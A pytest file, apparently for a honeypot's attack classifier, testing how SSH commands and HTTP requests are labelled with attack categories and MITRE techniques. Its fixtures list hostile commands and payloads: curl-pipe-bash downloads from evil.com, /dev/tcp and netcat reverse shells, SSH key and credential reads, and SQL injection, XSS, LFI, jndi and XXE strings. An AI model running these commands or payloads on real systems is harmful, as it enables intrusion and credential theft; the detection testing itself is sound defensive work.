"""
Tests for Member 5: attack classification. Includes every example from the project documents.
"""
import pytest

from app.core.classifiers import (COMMAND_PATTERNS, HTTP_ATTACK_SIGNATURES, classify_http_request,
                                  classify_ssh_command, get_risk_score)

SSH_CASES = [
    # (command, expected category, expected MITRE technique)
    ('whoami', 'recon', 'T1082'),
    ('id', 'recon', 'T1082'),
    ('uname -a', 'recon', 'T1082'),
    ('ifconfig', 'recon', 'T1082'),
    ('ps aux', 'recon', 'T1082'),
    ('cat /etc/passwd', 'recon', 'T1082'),
    ('ls -la', 'recon', 'T1082'),
    ('wget http://evil.com/malware', 'download', 'T1105'),
    ('curl http://evil.com/dropper.sh | bash', 'download', 'T1105'),
    ('tftp -g -r bot 1.2.3.4', 'download', 'T1105'),
    ('git clone https://github.com/x/y', 'download', 'T1105'),
    ('crontab -e', 'persistence', 'T1053'),
    ('systemctl enable backdoor', 'persistence', 'T1053'),
    ('echo ssh-rsa AAAA >> ~/.ssh/authorized_keys', 'persistence', 'T1053'),
    ('echo "* * * * * /tmp/miner" >> /var/spool/cron/crontabs/root', 'persistence', 'T1053'),
    ('useradd -m hacker', 'persistence', 'T1053'),
    ('chmod +x bot', 'exploit', 'T1059'),
    ('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1', 'exploit', 'T1059'),
    ('nc -e /bin/sh 1.2.3.4 4444', 'exploit', 'T1059'),
    ("python -c 'import socket,os'", 'exploit', 'T1059'),
    ('./xmrig -o stratum+tcp://pool:3333', 'cryptominer', 'T1496'),
    ('minergate-cli --user x', 'cryptominer', 'T1496'),
    ('cat .ssh/id_rsa', 'credential_access', 'T1552'),
    ('grep -r password /var/www', 'credential_access', 'T1552'),
    ('find / -name "*password*"', 'credential_access', 'T1552'),
    ('history', 'credential_access', 'T1552'),
    ('ssh root@10.0.0.5', 'lateral_movement', 'T1021'),
    ('nmap -sS 10.0.0.0/24', 'lateral_movement', 'T1021'),
    ('ping 192.168.1.1', 'lateral_movement', 'T1021'),
    ('sudo su', 'privilege_escalation', 'T1548'),
    ('cd /tmp', 'benign', ''),
    ('echo hello', 'benign', ''),
    ('', 'benign', ''),
    ('foobar --x', 'unknown', ''),
    ('pdftotext file', 'unknown', ''),    # "df" inside a word is not recon
]

HTTP_CASES = [
    ("/index.php?id=1' OR '1'='1", 'sqli'),
    ('/admin?id=1 UNION SELECT NULL', 'sqli'),
    ('/products?id=1 AND sleep(5)', 'sqli'),
    ('/x?q=1; DROP TABLE users', 'sqli'),
    ("/search?q=<script>alert('xss')</script>", 'xss'),     # quotes inside XSS are not SQLi
    ('/search?q=<img src=x onerror=alert(1)>', 'xss'),
    ('/r?u=javascript:alert(1)', 'xss'),
    ('/../etc/passwd', 'lfi'),
    ('/page?file=php://filter/resource=index.php', 'lfi'),
    ('/../../../windows/system32/config/sam', 'lfi'),
    ('/;whoami', 'rce'),
    ('/ping?host=1.1.1.1|cat /etc/passwd', 'rce'),
    ('/x?a=${jndi:ldap://evil/a}', 'rce'),
    ('/x?x=<!ENTITY xxe SYSTEM "file:///etc/passwd">', 'xxe'),
    ('/img/../logo.png', 'path_traversal'),
    ('/wp-admin', 'wordpress_scan'),
    ('/wp-login.php', 'wordpress_scan'),
    ('/xmlrpc.php', 'wordpress_scan'),
    ('/phpmyadmin', 'phpmyadmin_scan'),
    ('/pma/', 'phpmyadmin_scan'),
    ('/.env', 'sensitive_file_probe'),
    ('/.git/config', 'sensitive_file_probe'),
    ('/', 'benign'),
    ("/login?user=O'Brien", 'benign'),      # a name with an apostrophe is not an attack
    ('/compmanager', 'benign'),             # contains "pma" but is not phpMyAdmin
    ('/about-us', 'benign'),
    ('/products?id=5&sort=price', 'benign'),
]


@pytest.mark.parametrize('command, category, mitre', SSH_CASES)
def test_ssh_classification(command, category, mitre):
    got_category, got_mitre, _ = classify_ssh_command(command)
    assert (got_category, got_mitre) == (category, mitre)


@pytest.mark.parametrize('url, signature', HTTP_CASES)
def test_http_classification(url, signature):
    path, _, query = url.partition('?')
    assert classify_http_request('GET', path, query)[0] == signature


def test_http_body_is_checked():
    assert classify_http_request('POST', '/login', '', "username=admin' OR '1'='1&password=x")[0] == 'sqli'


def test_all_seven_documented_ssh_categories_exist():
    for name in ('recon', 'download', 'persistence', 'exploit', 'cryptominer', 'credential_access',
                 'lateral_movement'):
        assert COMMAND_PATTERNS[name]['mitre'].startswith('T')


def test_all_eight_documented_http_signatures_exist():
    for name in ('sqli', 'xss', 'lfi', 'rce', 'xxe', 'path_traversal', 'wordpress_scan', 'phpmyadmin_scan'):
        assert name in HTTP_ATTACK_SIGNATURES


def test_risk_scores():
    assert get_risk_score('cryptominer') > get_risk_score('recon') > get_risk_score('benign') == 0
